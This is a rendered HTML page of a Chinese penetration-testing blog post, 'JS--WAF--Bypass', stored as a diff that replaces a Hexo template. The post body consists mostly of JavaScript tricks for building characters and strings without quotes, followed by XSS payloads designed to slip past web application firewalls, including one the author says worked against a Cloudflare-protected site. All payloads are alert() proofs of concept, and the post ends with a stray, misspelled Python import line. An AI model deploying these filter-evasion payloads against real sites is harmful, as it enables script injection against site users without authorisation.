@@ -1,37 +1,813 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="①生成字符的方法：1. 生成&#x2F;code&#x2F;字符串123456var bs&#x3D; &amp;#x27;ao0PTA7YWxlcnQoMTMzNykvLwa&amp;#x27;;empty&#x3D;RegExp.prototype.flags;xx&#x3D;&amp;#123;&amp;#125;;xx.source&#x3D;bs;xx.flags&#x3D;empty;xx.toString&#x3D;RegExp.prototype.toString;  2.生成:(?)123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JS--WAF--Bypass">
+<meta property="og:url" content="http://laker.xyz/2020/07/27/%E5%89%8D%E7%AB%AF-WAF-Bypass/index.html">
+<meta property="og:site_name" content="laker&#39;s Blog">
+<meta property="og:description" content="①生成字符的方法：1. 生成&#x2F;code&#x2F;字符串123456var bs&#x3D; &amp;#x27;ao0PTA7YWxlcnQoMTMzNykvLwa&amp;#x27;;empty&#x3D;RegExp.prototype.flags;xx&#x3D;&amp;#123;&amp;#125;;xx.source&#x3D;bs;xx.flags&#x3D;empty;xx.toString&#x3D;RegExp.prototype.toString;  2.生成:(?)123">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-27T02:33:28.000Z">
+<meta property="article:modified_time" content="2020-07-27T06:24:04.000Z">
+<meta property="article:author" content="laker">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laker.xyz/2020/07/27/前端-WAF-Bypass/"/>
+
+
+
+
+
+  <title>JS--WAF--Bypass | laker's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">laker's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录渗透测试琐事仅仅</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laker.xyz/2020/07/27/%E5%89%8D%E7%AB%AF-WAF-Bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="laker's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">JS--WAF--Bypass</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-27T10:33:28+08:00">
+                2020-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="①生成字符的方法："><a href="#①生成字符的方法：" class="headerlink" title="①生成字符的方法："></a>①生成字符的方法：</h2><h3 id="1-生成-code-字符串"><a href="#1-生成-code-字符串" class="headerlink" title="1. 生成/code/字符串"></a>1. 生成/code/字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bs= <span class="string">&#x27;ao0PTA7YWxlcnQoMTMzNykvLwa&#x27;</span>;</span><br><span class="line">empty=<span class="built_in">RegExp</span>.prototype.flags;</span><br><span class="line">xx=&#123;&#125;;</span><br><span class="line">xx.source=bs;</span><br><span class="line">xx.flags=empty;</span><br><span class="line">xx.toString=<span class="built_in">RegExp</span>.prototype.toString;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-生成"><a href="#2-生成" class="headerlink" title="2.生成:(?)"></a>2.生成:(?)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yy=&#123;...RegExp.prototype.source&#125;</span><br><span class="line">yy.toString=<span class="built_in">Array</span>.prototype.shift</span><br><span class="line">yy.length=<span class="number">4</span></span><br><span class="line">left=yy+empty             <span class="comment">//生成(</span></span><br><span class="line">left=yy+<span class="number">1</span></span><br><span class="line">que = yy+empty            <span class="comment">//生成?</span></span><br><span class="line">que = yy+<span class="number">2</span></span><br><span class="line">colon=yy+empty            <span class="comment">//生成:</span></span><br><span class="line">right=yy+empty            <span class="comment">//生成)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-生成"><a href="#3-生成" class="headerlink" title="3.生成/"></a>3.生成/</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="built_in">console</span>;</span><br><span class="line">x.toString = <span class="built_in">RegExp</span>.prototype.toString;</span><br><span class="line">x.valueOf = <span class="built_in">String</span>.prototype.charAt;</span><br><span class="line">x + <span class="string">&quot;&quot;</span> <span class="comment">// /</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-生成"><a href="#4-生成" class="headerlink" title="4.生成["></a>4.生成[</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=console</span><br><span class="line">x.valueOf=String.prototype.charAt</span><br><span class="line">x + &quot;&quot; // [</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-字符串大小写转换"><a href="#5-字符串大小写转换" class="headerlink" title="5.字符串大小写转换"></a>5.字符串大小写转换</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="string">&quot;a&quot;</span>]</span><br><span class="line">x.valueOf = <span class="built_in">String</span>.prototype.toUpperCase</span><br><span class="line">x + <span class="string">&quot;&quot;</span> <span class="comment">// A</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="②Bypass-Waf"><a href="#②Bypass-Waf" class="headerlink" title="②Bypass Waf"></a>②Bypass Waf</h2><p>常见的一些方式这里就不说了，直接到<a target="_blank" rel="noopener" href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">这里</a>淘便是，这里仅说一下最近看到的。</p>
+<h3 id="1-使用展开符和正则绕过单引号"><a href="#1-使用展开符和正则绕过单引号" class="headerlink" title="1.使用展开符和正则绕过单引号"></a>1.使用展开符和正则绕过单引号</h3><p>首先将对象展开，然后将对象转为数组，最后用shift方法从数组中获取字符</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;...eval+<span class="number">0</span>,<span class="attr">toString</span>:<span class="built_in">Array</span>.prototype.shift,<span class="attr">length</span>:<span class="number">15</span>&#125;,</span><br><span class="line">x+x+x+x+x+x+x+x+x+x+x+x+x,</span><br><span class="line">x=<span class="regexp">/alert/</span>.source+x+<span class="number">1337</span>+x;</span><br><span class="line">location=<span class="regexp">/javascript:/</span>.source+x;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用instanceof"><a href="#2-使用instanceof" class="headerlink" title="2.使用instanceof"></a>2.使用instanceof</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[<span class="built_in">Symbol</span>.hasInstance]=<span class="built_in">eval</span></span><br><span class="line">atob<span class="string">`YWxlcnQoMSk`</span> <span class="keyword">instanceof</span> <span class="built_in">window</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-使用constructor"><a href="#3-使用constructor" class="headerlink" title="3.使用constructor"></a>3.使用constructor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atob.constructor(atob<span class="string">`YWxlcnQoMSk`</span>)<span class="string">``</span></span><br><span class="line">或者</span><br><span class="line">atob.constructor(atob(<span class="regexp">/YWxlcnQoMSk/</span>.source))()</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-使用新特性"><a href="#4-使用新特性" class="headerlink" title="4.使用新特性"></a>4.使用新特性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void&#x27;&#x27;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)</span><br></pre></td></tr></table></figure>
+
+<p>受到cloudflare保护的站存在XSS，构造了一个payload可执行弹窗，但是无法顺利执行任意JS:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;body/onload=&quot;</span><span class="keyword">throw</span>%20onerror=alert,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">11</span>;<span class="string">&quot;&gt;&lt;a+href=&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input<span class="comment">//onmouseover= &quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span></span><br><span class="line"><span class="keyword">import</span> reqursts</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/sweetalert/1.1.2/sweetalert.min.css">
+
+  <p><span>本文标题:</span>JS--WAF--Bypass</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2020年07月27日 - 10:33:28</p>
+  <p><span>最后更新:</span>2020年07月27日 - 14:24:04</p>
+  <p><span>原始链接:</span><a href="/2020/07/27/%E5%89%8D%E7%AB%AF-WAF-Bypass/" title="JS--WAF--Bypass">http://laker.xyz/2020/07/27/%E5%89%8D%E7%AB%AF-WAF-Bypass/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://laker.xyz/2020/07/27/%E5%89%8D%E7%AB%AF-WAF-Bypass/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/17/cmd%E3%80%81bash%E3%80%81powershell%E6%89%80%E8%A7%81%E5%8D%B3%E6%89%80%E5%AD%A6/" rel="next" title="cmd、bash、powershell所见即所学">
+                <i class="fa fa-chevron-left"></i> cmd、bash、powershell所见即所学
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/29/Windows%E6%97%A5%E5%BF%97%E3%80%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/" rel="prev" title="Windows日志、敏感文件总结">
+                Windows日志、敏感文件总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.th3wind.xyz" title="th3wind" target="_blank">th3wind</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com/" title="damit5" target="_blank">damit5</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A0%E7%94%9F%E6%88%90%E5%AD%97%E7%AC%A6%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">①生成字符的方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%94%9F%E6%88%90-code-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.1.</span> <span class="nav-text">1. 生成&#x2F;code&#x2F;字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%94%9F%E6%88%90"><span class="nav-number">1.2.</span> <span class="nav-text">2.生成:(?)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%94%9F%E6%88%90"><span class="nav-number">1.3.</span> <span class="nav-text">3.生成&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%94%9F%E6%88%90"><span class="nav-number">1.4.</span> <span class="nav-text">4.生成[</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.5.</span> <span class="nav-text">5.字符串大小写转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A1Bypass-Waf"><span class="nav-number">2.</span> <span class="nav-text">②Bypass Waf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E5%B1%95%E5%BC%80%E7%AC%A6%E5%92%8C%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="nav-number">2.1.</span> <span class="nav-text">1.使用展开符和正则绕过单引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8instanceof"><span class="nav-number">2.2.</span> <span class="nav-text">2.使用instanceof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8constructor"><span class="nav-number">2.3.</span> <span class="nav-text">3.使用constructor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BD%BF%E7%94%A8%E6%96%B0%E7%89%B9%E6%80%A7"><span class="nav-number">2.4.</span> <span class="nav-text">4.使用新特性</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">laker</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
